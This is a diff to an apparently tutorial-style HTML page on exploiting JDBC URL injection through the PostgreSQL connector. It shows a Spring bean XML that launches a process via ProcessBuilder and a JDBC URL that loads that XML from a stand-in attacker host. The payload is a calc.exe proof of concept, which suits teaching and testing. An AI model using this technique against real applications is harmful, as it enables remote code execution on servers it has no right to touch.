@@ -91,28 +91,27 @@ layout: default
                     <p>Instead of Mysql if the Application uses Postgres Connector then we can exploit it using the followsing steps</p>
                     <ul>
                         <li>Host a bean xml file with the following contents</li>
+                        <code>
+                            <pre>
+                                <code><pre>
+                    &ltbeans xmlns="http://www.springframework.org/schema/beans"
+                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+                    &ltbean id="pb" class="java.lang.ProcessBuilder">
+                    &ltconstructor-arg>
+                    &ltlist>
+                    &ltvalue>calc.exe&lt/value>
+                    &lt/list>
+                    &lt/constructor-arg>
+                    &ltproperty name="whatever" value="#{ pb.start() }" />
+                    &lt/bean>
+                    &lt/beans>
+                                    </pre></code>
+                            </pre>
+                        </code>
                         <li>Pass the below JDBC Url to the target application</li>
                         <code><pre>jdbc:postgresql://canbeanything/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.server:9001/test.xml</pre></code>
                     </ul>
                     <div>
-                        Contents of test.xml
-                        <code>
-                            <pre>
-                                <code><pre>
-                                    &ltbeans xmlns="http://www.springframework.org/schema/beans"
-                                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-                                    &ltbean id="pb" class="java.lang.ProcessBuilder">
-                                    &ltconstructor-arg>
-                                    &ltlist>
-                                    &ltvalue>calc.exe&lt/value>
-                                    &lt/list>
-                                    &lt/constructor-arg>
-                                    &ltproperty name="whatever" value="#{ pb.start() }" />
-                                    &lt/bean>
-                                    &lt/beans>
-                                    </pre></code>
-                            </pre>
-                        </code>
                     </div>
                 <div><video width="900" controls><source src="videos/Postgresexploit.mp4" type="video/mp4"></video></div>
                 <div>
